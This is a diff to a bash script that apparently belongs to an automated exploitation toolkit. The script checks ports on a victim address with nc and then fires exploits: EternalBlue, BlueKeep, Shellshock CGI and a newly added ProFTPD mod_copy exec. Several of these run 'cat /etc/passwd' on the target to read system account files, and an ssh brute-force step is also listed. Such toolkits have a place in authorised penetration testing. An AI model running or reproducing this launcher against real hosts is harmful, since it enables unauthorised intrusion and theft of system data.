@@ -55,7 +55,8 @@ function checkPort {
 	ARGS="${*:3}"
 	convertArgsStrToArray $ARGS
 	COMMAND=$2
-	nc -zv $VICTIM_ADDRESS $1
+	#nc -zv $VICTIM_ADDRESS $1
+    echo -e $1 | xargs -i nc -w 1 -zvn $VICTIM_ADDRESS {}
 	if [ $? -eq 0 ]; then
 		echo executing $COMMAND $ARGS
 		echo "logfile: $LOG_DIR/$LOG_FILE.log"
@@ -71,14 +72,12 @@ checkPort 445 python $ETHSPLOITER_PATH/exploits/windows/eternalblue/eternalblue_
 testInfo "bluekeep"
 checkPort 3389 python3 $ETHSPLOITER_PATH/exploits/windows/bluekeep/win7_32_poc.py $VICTIM_ADDRESS
 
-#nc -zv 192.168.20.122 80
-#if [ checkPort 80 -eq 0 ]; then
-#	/home/pi/Ethsploiter/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh 192.168.20.122 /cgi-bin/hw.cgi "cat /etc/passwd" > /home/pi/passwords_surprise &
-#ff
-
 # Linux
 testInfo "shellshock_Apache_CGI"
 checkPort 80 $ETHSPLOITER_PATH/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh $VICTIM_ADDRESS /cgi-bin/hw.cgi \"cat /etc/passwd\"
+
+testInfo "proftpd_modcopy_exec"
+checkPort "21\n80" python3 $ETHSPLOITER_PATH/exploits/unix/ftp/proftpd_modcopy_exec/exploit.py --host $VICTIM_ADDRESS --port 21 --path /var/www/html --cmd \"cat /etc/passwd\"
 
 #multi
 testInfo "ssh_brute_force"
